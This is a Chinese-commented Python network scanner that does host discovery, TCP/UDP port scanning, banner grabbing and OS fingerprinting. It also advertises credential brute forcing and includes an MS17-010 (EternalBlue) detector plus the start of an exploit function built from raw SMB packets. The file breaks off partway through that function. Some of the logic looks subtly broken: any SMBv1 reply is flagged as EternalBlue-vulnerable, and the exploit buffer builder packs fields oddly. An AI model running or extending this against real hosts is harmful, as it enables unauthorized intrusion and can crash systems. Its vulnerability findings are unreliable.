#!/usr/bin/env python3
"""
全网段端口扫描器 - 多功能网络安全扫描工具

功能特性:
  1. ICMP Ping 存活主机探测
  2. 多线程 TCP 端口扫描 (支持全端口 1-65535)
  3. UDP 端口扫描
  4. 服务/版本识别 (Banner Grabbing)
  5. 操作系统指纹识别 (TTL + TCP Window Size)
  6. 常见漏洞端口高亮标记
  7. CIDR 网段支持 (如 192.168.1.0/24)
  8. 结果导出 JSON / CSV / HTML 报告
  9. 实时进度显示
  10. 可自定义端口列表
  11. SSH/MySQL/MSSQL 弱口令爆破

依赖: 仅使用 Python 标准库, 无需额外安装
  (SSH爆破建议安装 paramiko: pip install paramiko)
"""

import sys
import os

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_DIR = os.path.join(SCRIPT_DIR, "reports")
sys.path.insert(0, os.path.join(SCRIPT_DIR, "libs"))
import socket
import struct
import threading
import queue
import ipaddress
import json
import csv
import time
import argparse
import platform
import re
import random
import select
import hashlib
import string
from datetime import datetime
from collections import OrderedDict, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Tuple, Set, Optional, Any

# ============================================================================
# 常量定义
# ============================================================================

# 常见端口服务映射 (端口号 -> 服务名)
PORT_SERVICE_MAP: Dict[int, str] = {
    20: "FTP-DATA", 21: "FTP", 22: "SSH", 23: "Telnet",
    25: "SMTP", 53: "DNS", 67: "DHCP-Server", 68: "DHCP-Client",
    69: "TFTP", 80: "HTTP", 88: "Kerberos", 110: "POP3",
    111: "RPC", 119: "NNTP", 123: "NTP", 135: "MS-RPC",
    137: "NetBIOS-NS", 138: "NetBIOS-DGM", 139: "NetBIOS-SSN",
    143: "IMAP", 161: "SNMP", 162: "SNMP-Trap", 179: "BGP",
    194: "IRC", 389: "LDAP", 443: "HTTPS", 445: "SMB",
    465: "SMTPS", 514: "Syslog", 515: "LPD", 543: "KLogin",
    544: "KShell", 548: "AFP", 554: "RTSP", 587: "SMTP-Submission",
    593: "MS-RPC-HTTPS", 623: "IPMI", 631: "IPP", 636: "LDAPS",
    873: "Rsync", 902: "VMware", 993: "IMAPS", 995: "POP3S",
    1025: "MS-RPC-2", 1080: "SOCKS", 1099: "RMI-Registry",
    1121: "Memcached", 1158: "Oracle-DB-Console", 1194: "OpenVPN",
    1352: "Lotus-Notes", 1433: "MSSQL", 1434: "MSSQL-Browser",
    1521: "Oracle-DB", 1723: "PPTP", 1812: "RADIUS", 1883: "MQTT",
    2000: "Cisco-SCCP", 2049: "NFS", 2082: "cPanel", 2083: "cPanel-SSL",
    2181: "ZooKeeper", 2222: "DirectAdmin", 2375: "Docker-REST",
    2376: "Docker-REST-TLS", 2483: "Oracle-DB-SSL", 3128: "Squid-Proxy",
    3260: "iSCSI", 3306: "MySQL", 3389: "RDP", 3690: "SVN",
    4369: "Erlang-EPMD", 4444: "Metasploit-Default", 4505: "SaltStack-Master",
    4506: "SaltStack-Minion", 4567: "Sinatra", 4786: "Cisco-Smart-Install",
    4800: "i2p", 4848: "GlassFish", 5000: "Docker-Registry",
    5005: "Docker-Registry-2", 5044: "Logstash-Beats", 5060: "SIP",
    5222: "XMPP", 5269: "XMPP-S2S", 5353: "mDNS", 5357: "WSDAPI",
    5432: "PostgreSQL", 5555: "Android-ADB", 5601: "Kibana",
    5672: "RabbitMQ", 5683: "CoAP", 5700: "Redis-Sentinel",
    5800: "VNC-HTTP", 5900: "VNC", 5938: "TeamViewer",
    5984: "CouchDB", 5985: "WinRM-HTTP", 5986: "WinRM-HTTPS",
    6000: "X11", 6080: "SPICE", 6379: "Redis",
    6443: "K8s-API", 6666: "IRC-Default", 6667: "IRC",
    7001: "WebLogic", 7002: "WebLogic-SSL", 7077: "Spark-Master",
    7474: "Neo4j-HTTP", 7547: "CWMP", 8000: "HTTP-Alt",
    8009: "AJP", 8010: "HTTP-Alt-2", 8042: "Orthanc",
    8080: "HTTP-Proxy", 8081: "HTTP-Proxy-Alt", 8088: "HTTP-Alt",
    8200: "Vault", 8443: "HTTPS-Alt", 8500: "Consul-HTTP",
    8834: "Nessus", 8888: "HTTP-Alt-3", 8983: "Solr",
    9000: "SonarQube", 9001: "HDFS", 9042: "Cassandra",
    9090: "Prometheus", 9092: "Kafka", 9100: "Printer-Raw",
    9200: "Elasticsearch", 9300: "Elasticsearch-Node",
    9443: "VMware-vSphere", 9999: "HTTP-Alt-4",
    10000: "Webmin", 10050: "Zabbix-Agent", 10051: "Zabbix-Server",
    10443: "Splunkd", 11211: "Memcached", 15672: "RabbitMQ-Mgmt",
    16379: "Redis-Alt", 17001: "Windows-Defender",
    27017: "MongoDB", 27018: "MongoDB-Shard", 27019: "MongoDB-Config",
    37777: "Dahua-DVR", 47808: "BACnet", 49152: "Windows-RPC",
    49153: "Windows-RPC-2", 50000: "SAP-Dispatcher", 50030: "Hadoop",
    50060: "Hadoop-2", 50070: "Hadoop-3", 50075: "Hadoop-4",
    50090: "Hadoop-5", 54321: "PostgreSQL-Alt", 55672: "RabbitMQ-Alt",
    61616: "ActiveMQ-OpenWire", 61613: "ActiveMQ-STOMP",
}

# 高风险/漏洞端口 (常见攻击面)
VULNERABLE_PORTS: Dict[int, str] = {
    21: "FTP - 匿名登录/弱口令风险",
    22: "SSH - 弱口令/暴力破解风险",
    23: "Telnet - 明文传输/弱口令风险",
    25: "SMTP - 邮件伪造/开放中继",
    53: "DNS - DNS放大攻击/区域传输",
    80: "HTTP - Web漏洞(注入/XSS/RCE等)",
    110: "POP3 - 明文传输/弱口令",
    111: "RPC - NFS挂载/RPC漏洞",
    135: "MS-RPC - 永恒之蓝相关/远程利用",
    137: "NetBIOS - 信息泄露",
    139: "NetBIOS - 文件共享/弱口令",
    143: "IMAP - 明文传输/弱口令",
    161: "SNMP - 默认团体字/public访问",
    389: "LDAP - 信息泄露/弱口令",
    443: "HTTPS - Web漏洞(Heartbleed等)",
    445: "SMB - 永恒之蓝/MS17-010",
    873: "Rsync - 未授权访问",
    1099: "RMI-Registry - 反序列化漏洞",
    1433: "MSSQL - 弱口令/命令执行",
    1521: "Oracle-DB - 弱口令/TNS投毒",
    2049: "NFS - 未授权挂载",
    2375: "Docker-REST - 未授权API访问",
    2376: "Docker-REST-TLS - 未授权API访问",
    3128: "Squid-Proxy - 开放代理",
    3306: "MySQL - 弱口令/提权",
    3389: "RDP - 弱口令/BlueKeep(CVE-2019-0708)",
    3690: "SVN - 信息泄露",
    4444: "Metasploit - 后门监听端口",
    4786: "Cisco-Smart-Install - 远程利用",
    4848: "GlassFish - 弱口令/反序列化",
    5000: "Docker-Registry - 未授权访问",
    5432: "PostgreSQL - 弱口令/提权",
    5555: "Android-ADB - 未授权调试",
    5601: "Kibana - 未授权访问",
    5672: "RabbitMQ - 弱口令",
    5900: "VNC - 弱口令",
    5984: "CouchDB - 未授权访问",
    5985: "WinRM - 弱口令/远程执行",
    6379: "Redis - 未授权访问/写公钥",
    6443: "K8s-API - 未授权访问",
    7001: "WebLogic - 反序列化/弱口令",
    7474: "Neo4j - 未授权访问",
    8000: "HTTP-Alt - Web漏洞",
    8009: "AJP - Ghostcat(CVE-2020-1938)",
    8080: "HTTP-Proxy - Web漏洞/未授权代理",
    8088: "Hadoop-YARN - 未授权RCE",
    8161: "ActiveMQ-Admin - 弱口令/RCE",
    8200: "Vault - 未授权访问",
    8500: "Consul - 未授权访问",
    8834: "Nessus - 旧版本漏洞",
    8983: "Solr - 未授权访问/RCE",
    9000: "SonarQube - 信息泄露",
    9001: "HDFS - 未授权访问",
    9042: "Cassandra - 弱口令",
    9092: "Kafka - 未授权访问",
    9200: "Elasticsearch - 未授权访问/RCE",
    9300: "Elasticsearch-Node - 未授权访问",
    10000: "Webmin - 弱口令/RCE",
    10050: "Zabbix-Agent - 信息泄露",
    11211: "Memcached - 未授权访问/DDoS放大",
    15672: "RabbitMQ-Mgmt - 弱口令",
    27017: "MongoDB - 未授权访问",
    27018: "MongoDB-Shard - 未授权访问",
    50000: "SAP-Dispatcher - 信息泄露",
    61616: "ActiveMQ - 未授权访问",
}

# 常用端口列表 (快速扫描用)
COMMON_PORTS: List[int] = [
    20, 21, 22, 23, 25, 53, 67, 68, 69, 80, 88, 110, 111, 119, 123,
    135, 137, 138, 139, 143, 161, 162, 179, 194, 389, 443, 445, 464,
    465, 500, 514, 515, 520, 543, 544, 548, 554, 587, 593, 623, 631,
    636, 749, 873, 902, 989, 990, 993, 995, 1025, 1080, 1099, 1121,
    1158, 1194, 1241, 1352, 1433, 1434, 1521, 1701, 1723, 1812, 1883,
    2000, 2049, 2082, 2083, 2181, 2222, 2375, 2376, 2483, 3128, 3260,
    3306, 3389, 3690, 4369, 4444, 4505, 4506, 4567, 4786, 4800, 4848,
    5000, 5005, 5044, 5060, 5061, 5222, 5269, 5353, 5357, 5432, 5555,
    5601, 5672, 5683, 5700, 5800, 5900, 5938, 5984, 5985, 5986, 6000,
    6080, 6379, 6443, 6666, 6667, 7001, 7002, 7077, 7474, 7547, 8000,
    8009, 8010, 8042, 8080, 8081, 8088, 8200, 8443, 8500, 8834, 8888,
    8983, 9000, 9001, 9042, 9090, 9092, 9100, 9200, 9300, 9443, 9999,
    10000, 10050, 10051, 10443, 11211, 15672, 16379, 17001, 27017,
    27018, 27019, 37777, 47808, 49152, 49153, 50000, 50030, 50060,
    50070, 50075, 50090, 54321, 55672, 61616, 61613,
]

# 操作系统 TTL 特征
OS_TTL_SIGNATURES: Dict[str, List[Tuple[int, int]]] = {
    "Windows (>= 2000/XP/7/8/10/11)": [(128, 65535), (128, 8192)],
    "Linux (Kernel 2.x/3.x/4.x/5.x)": [(64, 29200), (64, 64240)],
    "FreeBSD": [(64, 65535)],
    "macOS / Darwin": [(64, 65535)],
    "Solaris": [(255, 24820)],
    "Cisco IOS": [(255, 4128)],
    "AIX": [(255, 65535)],
    "HP-UX": [(255, 32768)],
}

# Web 服务指纹
WEB_SERVER_SIGNATURES: Dict[str, str] = {
    "Apache": "Server: Apache",
    "nginx": "Server: nginx",
    "IIS": "Server: Microsoft-IIS",
    "Tomcat": "Apache-Coyote",
    "Jetty": "Server: Jetty",
    "Lighttpd": "Server: lighttpd",
    "Caddy": "Server: Caddy",
    "Gunicorn": "Server: gunicorn",
    "uWSGI": "Server: uWSGI",
}

# ============================================================================
# 数据结构
# ============================================================================

class ScanResult:
    """端口扫描结果"""

    def __init__(self, host: str, port: int, protocol: str = "TCP"):
        self.host = host
        self.port = port
        self.protocol = protocol
        self.state: str = "closed"
        self.service: str = ""
        self.banner: str = ""
        self.version: str = ""
        self.is_vulnerable: bool = False
        self.vuln_reason: str = ""
        self.response_time: float = 0.0
        self.ttl: int = 0
        self.os_guess: str = ""
        self.brute_result: Optional["BruteResult"] = None
        self.eternal_blue_vuln: bool = False
        self.eternal_blue_os: str = ""
        self.eternal_blue_version: str = ""
        self.vuln_findings: dict = {}

    def to_dict(self) -> dict:
        d = {
            "host": self.host,
            "port": self.port,
            "protocol": self.protocol,
            "state": self.state,
            "service": self.service,
            "banner": self.banner.strip(),
            "version": self.version,
            "is_vulnerable": self.is_vulnerable,
            "vuln_reason": self.vuln_reason,
            "response_time_ms": round(self.response_time * 1000, 2),
            "ttl": self.ttl,
            "os_guess": self.os_guess,
            "eternal_blue_vuln": self.eternal_blue_vuln,
            "eternal_blue_os": self.eternal_blue_os,
            "eternal_blue_version": self.eternal_blue_version,
            "vuln_findings": self.vuln_findings,
        }
        if self.brute_result:
            d["brute_force"] = self.brute_result.to_dict()
        return d


class BruteResult:
    """爆破结果"""

    def __init__(self):
        self.success: bool = False
        self.service: str = ""
        self.host: str = ""
        self.port: int = 0
        self.username: str = ""
        self.password: str = ""
        self.tried_count: int = 0
        self.elapsed: float = 0.0

    def to_dict(self) -> dict:
        return {
            "success": self.success,
            "service": self.service,
            "host": self.host,
            "port": self.port,
            "username": self.username,
            "password": self.password,
            "tried_count": self.tried_count,
            "elapsed_sec": round(self.elapsed, 2),
        }


class HostInfo:
    """主机信息"""

    def __init__(self, ip: str):
        self.ip = ip
        self.hostname: str = ""
        self.is_alive: bool = False
        self.mac_address: str = ""
        self.ttl: int = 0
        self.os_guess: str = ""
        self.open_ports: List[ScanResult] = []
        self.scan_time: float = 0.0

    def to_dict(self) -> dict:
        return {
            "ip": self.ip,
            "hostname": self.hostname,
            "is_alive": self.is_alive,
            "mac_address": self.mac_address,
            "os_guess": self.os_guess,
            "ttl": self.ttl,
            "open_ports_count": len(self.open_ports),
            "open_ports": [r.to_dict() for r in self.open_ports],
            "scan_time_sec": round(self.scan_time, 2),
        }

# ============================================================================
# 工具函数
# ============================================================================

def resolve_hostname(ip: str) -> str:
    """反向 DNS 解析"""
    try:
        return socket.gethostbyaddr(ip)[0]
    except (socket.herror, socket.gaierror):
        return ""


def get_service_name(port: int) -> str:
    """获取端口对应的服务名称"""
    if port in PORT_SERVICE_MAP:
        return PORT_SERVICE_MAP[port]
    try:
        return socket.getservbyport(port, "tcp")
    except (OSError, socket.error):
        return "unknown"


def check_vulnerable(port: int) -> Tuple[bool, str]:
    """检查是否为高风险/漏洞端口"""
    if port in VULNERABLE_PORTS:
        return True, VULNERABLE_PORTS[port]
    return False, ""


def guess_os_by_ttl(ttl: int) -> str:
    """通过 TTL 值猜测操作系统"""
    if ttl <= 32:
        return "路由器/嵌入式设备"
    elif ttl <= 64:
        return "Linux/Unix/macOS"
    elif ttl <= 128:
        return "Windows"
    elif ttl <= 255:
        return "Cisco/Solaris/网络设备"
    return "未知"


def is_private_ip(ip: str) -> bool:
    """判断是否为私有 IP"""
    try:
        return ipaddress.ip_address(ip).is_private
    except ValueError:
        return False


def get_local_ip() -> str:
    """获取本机 IP 地址"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.1)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def ip_to_int(ip: str) -> int:
    """IP 地址转整数, 域名返回一个极大的值使其排在末尾"""
    try:
        return struct.unpack("!I", socket.inet_aton(ip))[0]
    except OSError:
        return 10 ** 12


def int_to_ip(num: int) -> str:
    """整数转 IP 地址"""
    return socket.inet_ntoa(struct.pack("!I", num))


def resolve_domain(domain: str) -> List[str]:
    """将域名解析为 IP 地址列表"""
    try:
        _, _, ip_list = socket.gethostbyname_ex(domain)
        return ip_list
    except socket.gaierror:
        return []


def parse_targets(target_str: str) -> List[str]:
    """解析目标地址字符串, 支持:
    - 单个 IP: 192.168.1.1
    - 域名: example.com, www.example.com
    - IP 范围: 192.168.1.1-192.168.1.254
    - CIDR: 192.168.1.0/24
    - 逗号分隔混合: 192.168.1.1,10.0.0.0/24,example.com
    """
    targets: List[str] = []
    for part in target_str.replace(" ", "").split(","):
        if not part:
            continue
        if "-" in part and "/" not in part:
            try:
                start, end = part.split("-")
                start_int = ip_to_int(start)
                end_int = ip_to_int(end)
                if start_int >= 10 ** 12 or end_int >= 10 ** 12:
                    print(f"[!] 范围不支持域名: {part}")
                    continue
                for ip_int in range(start_int, end_int + 1):
                    targets.append(int_to_ip(ip_int))
            except Exception:
                print(f"[!] 无效的范围格式: {part}")
        elif "/" in part:
            try:
                network = ipaddress.ip_network(part, strict=False)
                for addr in network.hosts():
                    targets.append(str(addr))
            except ValueError:
                print(f"[!] 无效的 CIDR 格式: {part}")
        else:
            try:
                ipaddress.ip_address(part)
                targets.append(part)
            except ValueError:
                ips = resolve_domain(part)
                if ips:
                    targets.extend(ips)
                else:
                    print(f"[!] 无法解析: {part}")
    return sorted(set(targets), key=ip_to_int)


# ============================================================================
# ICMP Ping 存活探测
# ============================================================================

def icmp_ping(ip: str, timeout: float = 1.0) -> Tuple[bool, int, str]:
    """ICMP Ping 探测主机是否存活 (Windows 兼容)"""
    system = platform.system().lower()

    if system == "windows":
        cmd = f"ping -n 1 -w {int(timeout * 1000)} {ip}"
    else:
        cmd = f"ping -c 1 -W {int(timeout)} {ip}"

    import subprocess
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=timeout + 2
        )
        output = result.stdout + result.stderr
        alive = result.returncode == 0

        ttl = 0
        if alive:
            if system == "windows":
                match = re.search(r"TTL=(\d+)", output, re.IGNORECASE)
            else:
                match = re.search(r"ttl=(\d+)", output, re.IGNORECASE)
            if match:
                ttl = int(match.group(1))

        os_guess = guess_os_by_ttl(ttl) if alive else ""
        return alive, ttl, os_guess
    except Exception:
        return False, 0, ""


def tcp_ping(ip: str, port: int = 80, timeout: float = 1.0) -> bool:
    """TCP Ping 探测主机存活 (适用于禁用 ICMP 的主机)"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception:
        return False


# ============================================================================
# 端口扫描核心
# ============================================================================

def tcp_connect_scan(ip: str, port: int, timeout: float = 2.0) -> Optional[ScanResult]:
    """TCP Connect 端口扫描 + Banner 获取"""
    result = ScanResult(ip, port, "TCP")
    start_time = time.time()

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)

        connect_result = sock.connect_ex((ip, port))
        result.response_time = time.time() - start_time

        if connect_result == 0:
            result.state = "open"
            result.service = get_service_name(port)
            result.is_vulnerable, result.vuln_reason = check_vulnerable(port)

            # 获取 TTL 信息
            try:
                ttl_option = sock.getsockopt(socket.IPPROTO_IP, 2)
                result.ttl = ttl_option
            except Exception:
                result.ttl = 0

            # Banner 抓取
            try:
                sock.settimeout(min(timeout, 1.5))
                # 发送探测数据包
                probe = get_probe_packet(port)
                if probe:
                    sock.send(probe)
                banner_data = b""
                while True:
                    try:
                        chunk = sock.recv(1024)
                        if not chunk:
                            break
                        banner_data += chunk
                        if len(banner_data) >= 4096:
                            break
                    except socket.timeout:
                        break
                result.banner = banner_data.decode("utf-8", errors="replace")
                if result.banner:
                    result.version = extract_version_from_banner(result.banner, port)
            except Exception:
                pass

            if port == 445 and result.state == "open":
                try:
                    _detect_eternal_blue(result, timeout)
                except Exception:
                    pass
            _detect_vulns_for_port(result, timeout)

        elif connect_result == 10061:
            result.state = "closed"
        elif connect_result == 10060:
            result.state = "filtered"
        elif connect_result == 10054:
            result.state = "filtered"
        else:
            result.state = f"error({connect_result})"

        sock.close()
    except socket.timeout:
        result.state = "filtered(timeout)"
        result.response_time = time.time() - start_time
    except Exception as e:
        result.state = f"error({e})"

    return result


def udp_scan(ip: str, port: int, timeout: float = 2.0) -> Optional[ScanResult]:
    """UDP 端口扫描"""
    result = ScanResult(ip, port, "UDP")
    start_time = time.time()

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)

        # 发送探测数据包
        probe = get_udp_probe(port)
        sock.sendto(probe, (ip, port))

        try:
            data, addr = sock.recvfrom(1024)
            result.state = "open"
            result.banner = data.decode("utf-8", errors="replace")
            result.service = get_service_name(port)
            result.is_vulnerable, result.vuln_reason = check_vulnerable(port)
        except socket.timeout:
            # UDP 无响应可能是 open|filtered
            # 尝试发送第二个包确认
            try:
                sock.sendto(probe, (ip, port))
                sock.settimeout(timeout / 2)
                data, _ = sock.recvfrom(1024)
                result.state = "open"
            except socket.timeout:
                result.state = "open|filtered"
            except Exception:
                result.state = "open|filtered"
        except ConnectionResetError:
            result.state = "closed"
        except Exception as e:
            result.state = f"error({e})"

        result.response_time = time.time() - start_time
        sock.close()
    except Exception as e:
        result.state = f"error({e})"

    return result


# ============================================================================
# 探测数据包 / Banner 分析
# ============================================================================

def get_probe_packet(port: int) -> Optional[bytes]:
    """根据端口返回合适的探测数据包"""
    probes = {
        21: b"",  # FTP - 等待服务器 Banner
        22: b"",
        23: b"",
        25: b"HELO scan.local\r\n",
        80: b"GET / HTTP/1.0\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n",
        110: b"",
        143: b"",
        443: b"\x16\x03\x01\x00\xa1\x01\x00\x00\x9d\x03\x03",
        587: b"HELO scan.local\r\n",
        3306: b"",
        3389: b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00",
        5432: b"",
        6379: b"*1\r\n$4\r\nPING\r\n",
        8080: b"GET / HTTP/1.0\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n",
        9200: b"GET / HTTP/1.0\r\nHost: {host}\r\n\r\n",
        27017: b"",
    }
    return probes.get(port, None)


def get_udp_probe(port: int) -> bytes:
    """UDP 探测数据包"""
    probes = {
        53: b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07version\x04bind\x00\x00\x10\x00\x03",
        161: b"\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x19\x02\x01\x00\x02\x01\x00\x02\x01\x00\x30\x0e\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00",
        123: b"\x1b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        137: b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        500: b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        1900: b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n",
    }
    return probes.get(port, b"\x00")


def extract_version_from_banner(banner: str, port: int) -> str:
    """从 Banner 中提取版本信息"""
    patterns = [
        r"SSH-\d+\.\d+-([^\s]+)",
        r"Server:\s*([^\r\n]+)",
        r"X-Powered-By:\s*([^\r\n]+)",
        r"Set-Cookie:\s*([^\r\n]+)",
        r"([^\s]+) \(([^)]+)\)",
    ]

    for pattern in patterns:
        match = re.search(pattern, banner, re.IGNORECASE)
        if match:
            if len(match.groups()) >= 2:
                return f"{match.group(1)} ({match.group(2)})"
            return match.group(1).strip()

    # 检查是否为 HTTP 响应
    if banner.startswith("HTTP/"):
        first_line = banner.split("\r\n")[0]
        return first_line.strip()

    # 截取第一行
    first_line = banner.split("\n")[0].strip()
    if len(first_line) > 3 and len(first_line) < 200:
        return first_line

    return ""


def identify_web_server(banner: str) -> str:
    """识别 Web 服务器类型"""
    for name, signature in WEB_SERVER_SIGNATURES.items():
        if signature.lower() in banner.lower():
            return name
    return ""


# ============================================================================
# 永恒之蓝 (MS17-010) 检测与利用模块
# 仅供授权安全测试使用, 请勿用于非法目的
# ============================================================================

def _detect_eternal_blue(result: ScanResult, timeout: float = 3.0):
    """检测目标是否存在 MS17-010 永恒之蓝漏洞 (SMBv1)

    策略: 只发送 SMBv1 方言 (NT LM 0.12), 强制服务器协商 SMBv1。
    如果服务器回复 STATUS_SUCCESS, 则 SMBv1 已启用。
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((result.host, 445))

        smb_header = (
            b"\xff\x53\x4d\x42"           # Protocol (4)
            + bytes([0x72])               # Command: Negotiate (1)
            + b"\x00" * 4                 # NT Status (4)
            + bytes([0x18])               # Flags (1)
            + b"\xc8\x01"                 # Flags2 (2)
            + b"\x00" * 12                # PIDHigh(2) + Security(8) + Reserved(2)
            + b"\x00" * 4                 # TID(2) + PIDLow(2)
            + b"\x00" * 4                 # UID(2) + MID(2)
        )
        dialect = b"\x02NT LM 0.12\x00"
        params = b"\x00" + struct.pack("<H", len(dialect)) + dialect
        body = smb_header + params
        neg_proto = b"\x00" + struct.pack(">I", len(body))[1:] + body
        sock.sendall(neg_proto)

        response = b""
        sock.settimeout(timeout)
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if len(response) >= 4096:
                    break
            except socket.timeout:
                break

        sock.close()

        if len(response) < 4 or b"\xff\x53\x4d\x42" not in response:
            return

        smb_start = response.find(b"\xff\x53\x4d\x42")
        if smb_start + 5 > len(response):
            return

        cmd = response[smb_start + 4]
        if cmd != 0x72:
            return

        status = struct.unpack("<I", response[smb_start + 5:smb_start + 9])[0] if smb_start + 9 <= len(response) else 0

        dialect_index = 0
        word_count = response[smb_start + 32] if len(response) > smb_start + 32 else 0
        if word_count > 0 and len(response) > smb_start + 34:
            dialect_off = smb_start + 33
            dialect_index = struct.unpack("<H", response[dialect_off:dialect_off + 2])[0]

        os_name = ""
        os_version = ""

        response_text = response.decode("latin-1", errors="replace")

        for field in response_text.split("\x00"):
            if "Windows" in field and len(field) > 5:
                f = field.strip()
                if "5.0" in f or "2000" in f:
                    os_name = f
                elif "5.1" in f or "XP" in f:
                    os_name = f
                elif "5.2" in f or "2003" in f:
                    os_name = f
                elif "6.0" in f or "Vista" in f or "2008" in f:
                    os_name = f
                elif "6.1" in f or "7" in f or "2008 R2" in f:
                    os_name = f
                elif "6.2" in f or "8" in f or "2012" in f:
                    os_name = f
                elif "6.3" in f or "8.1" in f or "2012 R2" in f:
                    os_name = f
                elif "10.0" in f or "10" in f or "2016" in f or "2019" in f:
                    os_name = f
                else:
                    os_name = f
                break

        # 只发了SMBv1方言, 服务器正常回复即表示SMBv1已启用
        # status 为 0 (STATUS_SUCCESS) 或 dialect_index 为 0 均表示协商成功
        smbv1_detected = (status == 0 or dialect_index == 0)

        if smbv1_detected and os_name:
            result.eternal_blue_vuln = True
            result.eternal_blue_os = os_name
            result.eternal_blue_version = os_version or "SMBv1"
            result.is_vulnerable = True
            if not result.vuln_reason:
                result.vuln_reason = f"SMB - 永恒之蓝(MS17-010) ({os_name})"
            else:
                result.vuln_reason += f" | 永恒之蓝(MS17-010) ({os_name})"
            _mark_vuln(result, "eternal_blue", {
                "vuln": True,
                "desc": f"SMB - 永恒之蓝(MS17-010) ({os_name})",
                "os": os_name,
                "version": os_version or "SMBv1",
            })
        elif smbv1_detected:
            result.eternal_blue_vuln = True
            result.eternal_blue_os = "Unknown (SMBv1)"
            result.eternal_blue_version = "SMBv1"
            result.is_vulnerable = True
            if not result.vuln_reason:
                result.vuln_reason = "SMB - 永恒之蓝(MS17-010) (SMBv1)"
            else:
                result.vuln_reason += " | 永恒之蓝(MS17-010) (SMBv1)"
            _mark_vuln(result, "eternal_blue", {
                "vuln": True,
                "desc": "SMB - 永恒之蓝(MS17-010) (SMBv1)",
                "os": "Unknown (SMBv1)",
                "version": "SMBv1",
            })

    except Exception:
        pass


def _eb_create_fealist(count: int) -> bytes:
    """构造永恒之蓝 FeaList 缓冲区"""
    fea = b""
    for i in range(count):
        fea += struct.pack("<I", 0x10000)          # NextEntryOffset
        fea += b"\x00"                              # Flags (FILE_ATTRIBUTE_NORMAL)
        fea += struct.pack("<I", ord("A") + (i % 26))  # FileNameLength (1 byte)
        fea += struct.pack("<H", 0)                 # EaNameLength
        fea += struct.pack("<H", 0)                 # EaValueLength
        fea += chr(ord("A") + (i % 26)).encode()    # FileName
    return fea


def _eb_build_srv_buffers(data: bytes) -> bytes:
    """构造 SRV buffer 头"""
    return struct.pack("<H", len(data)) + data


def exploit_eternal_blue(ip: str, timeout: float = 10.0):
    """
    永恒之蓝 (MS17-010) 利用

    [!!!] 警告: 此功能仅供授权安全测试使用
    [!!!] 可能造成目标系统蓝屏崩溃 (BSOD)
    [!!!] 使用前请确保已获得书面授权

    Returns:
        dict: {"success": bool, "info": str, "output": bytes}
    """
    output = b""
    info_parts = []

    try:
        # Step 1: SMB Negotiate Protocol
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, 445))

        neg_hdr = (
            b"\xff\x53\x4d\x42\x72\x00\x00\x00\x00"
            b"\x18\x01\x28\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\xff\xfe\x00\x00"
        )
        neg_dialect = b"\x00\x0b\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00"
        neg_body = neg_hdr + neg_dialect
        neg_proto = b"\x00" + struct.pack(">I", len(neg_body))[1:] + neg_body
        sock.sendall(neg_proto)
        try:
            resp = sock.recv(4096)
            output += resp
        except socket.timeout:
            pass

        # Step 2: SMB Session Setup AndX
        session_body = (
            b"\xff\x53\x4d\x42\x73\x00\x00\x00\x00"
            b"\x18\x07\xc0\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\xff\xfe\x00"
            b"\x00\x40\x00\x0c\xff\x00\xa4\x00\x04"
            b"\x11\x0a\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\xd4\x00\x00"
            b"\x80\x69\x00\x4e\x54\x4c\x4d\x53\x53"
            b"\x50\x00\x01\x00\x00\x00\x97\x82\x08"
            b"\xe0\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x0a"
            b"\x00\x0a\x00\x38\x00\x00\x00\x0f\x43"
            b"\x00\x49\x00\x46\x00\x53\x00\x00\x00"
            b"\x00\x00\x00\x00"
        )
        session_setup = b"\x00" + struct.pack(">I", len(session_body))[1:] + session_body
        sock.sendall(session_setup)
        try:
            resp = sock.recv(4096)
            output += resp
